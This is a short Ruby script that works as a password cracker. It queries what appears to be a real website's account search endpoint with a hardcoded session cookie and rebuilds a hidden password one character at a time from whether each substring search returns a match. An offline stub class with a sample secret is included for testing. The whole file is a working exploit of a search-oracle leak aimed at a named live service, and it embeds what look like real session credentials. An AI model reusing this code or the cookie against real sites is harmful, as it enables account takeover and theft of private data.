require 'faraday'

class PasswordCracker
  ALPHABET = (('a'..'z').to_a + ('0'..'9').to_a).shuffle
  SUBJECT = 'Password'

  def initialize(api)
    @api = api
    @password = ''
  end

  def crack!
    find_starting_letter!
    puts "Found first letter: #{@password}"
    puts "\nBuilding forward!\n"
    build_forward!
    puts "\nBuilding backward!\n"
    build_backward!
    puts "Done! The result is #{@password}."
    puts "We found it in #{@api.iterations} iterations"
    @password
  end

  private

  def find_starting_letter!
    candidate_letters = ALPHABET - SUBJECT.chars
    @password = candidate_letters.find { |char| @api.include?(char) }
  end

  def build_forward!
    build!(forward: true)
  end

  def build_backward!
    build!(forward: false)
  end

  def build!(forward:)
    puts "Current password: #{@password}"
    ALPHABET.each do |char|
      guess = forward ? @password + char : char + @password

      if @api.include?(guess)
        @password = guess
        build!(forward: forward)
        return
      end
    end
  end
end

class Api
  BASE_URL = 'http://www.lettermelater.com/account.php'
  COOKIE = 'code=13fa1fa011169ab29007fcad17b2ae; user_id=279789'
  @iterations = 0

  def self.get(query)
    @iterations += 1
    Faraday.get(BASE_URL, { qe: query }, Cookie: COOKIE).body
  end

  def self.include?(substring)
    get(substring).include?('password')
  end

  def self.iterations
    @iterations
  end
end

class ApiStub
  SECRET_PASSWORD = 'g420hpfjpefoj490rjgsd'
  @iterations = 0

  def self.include?(substring)
    @iterations += 1
    SECRET_PASSWORD.include?(substring)
  end
  
  def self.iterations
    @iterations
  end
end
